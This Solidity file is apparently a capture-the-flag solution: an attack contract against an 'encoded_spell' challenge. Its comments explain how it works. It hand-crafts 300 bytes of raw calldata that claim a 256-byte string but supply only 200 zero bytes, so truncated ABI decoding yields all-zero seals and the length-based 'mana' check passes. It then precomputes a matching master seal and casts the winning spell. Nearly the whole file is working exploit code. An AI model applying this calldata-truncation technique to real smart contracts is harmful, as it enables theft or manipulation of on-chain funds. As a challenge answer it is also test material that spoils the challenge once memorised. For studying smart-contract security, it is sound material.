// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import {Challenge, Spell} from "targets/encoded_spell/src/Challenge.sol";

/// @title EncodedSpellAttack
/// @notice Exploits truncated-calldata ABI decoding in createMagicCircle.
///
/// The trick:
///   createMagicCircle(string calldata runes, bytes32 newMasterSeal)
///     - mana = msg.data.length               → we need mana == 300 for "CURAGA"
///     - weakSeals = abi.decode(bytes(runes), (bytes32[8]))
///
///   By crafting raw calldata that claims runes.length = 256 but only supplies
///   200 zero bytes, the EVM reads past calldata end — returning zeros.
///   So weakSeals becomes bytes32[8] of all zeros.
///
///   Total calldata = 4 (selector) + 32 (offset) + 32 (masterSeal) + 32 (length) + 200 (data)
///                  = 300 bytes  →  mana = 300  ✓
///
///   Then cast("CURAGA", enchantments=[1,1,...,1]) beats all zero weakSeals and
///   the pre-computed masterSeal matches.
contract EncodedSpellAttack {
    Challenge public challenge;

    constructor(address _challenge) {
        challenge = Challenge(_challenge);
    }

    function attack() external {
        // Step 1: build the Spell we'll cast later
        bytes32[8] memory encs;
        for (uint i; i < 8; i++) {
            encs[i] = bytes32(uint256(1)); // enchantment[i] > weakSeal[i] (0)
        }
        Spell memory spell = Spell({name: "CURAGA", enchantments: encs});

        // Step 2: compute masterSeal that cast() will verify
        bytes32 masterSeal = keccak256(abi.encode(spell));

        // Step 3: craft 300-byte calldata
        //   4   bytes  selector
        //  32   bytes  offset to runes tail = 0x40 (64, past both head slots)
        //  32   bytes  newMasterSeal
        //  32   bytes  runes.length = 256 (claimed, not actual)
        // 200   bytes  runes data (zeros — truncated; EVM pads rest with 0)
        // ─────────────────────────────────────────────────────
        // 300   bytes  total  →  mana = 300
        bytes memory rawCall = abi.encodePacked(
            challenge.createMagicCircle.selector,
            uint256(0x40),   // offset to runes tail
            masterSeal,      // newMasterSeal param
            uint256(256),    // runes.length (lies — only 200 bytes follow)
            new bytes(200)   // truncated runes data (all zeros)
        );

        (bool ok, ) = address(challenge).call(rawCall);
        require(ok, "createMagicCircle failed");

        // Step 4: cast the spell — beats zero weakSeals and matches masterSeal
        challenge.cast(spell);
    }
}
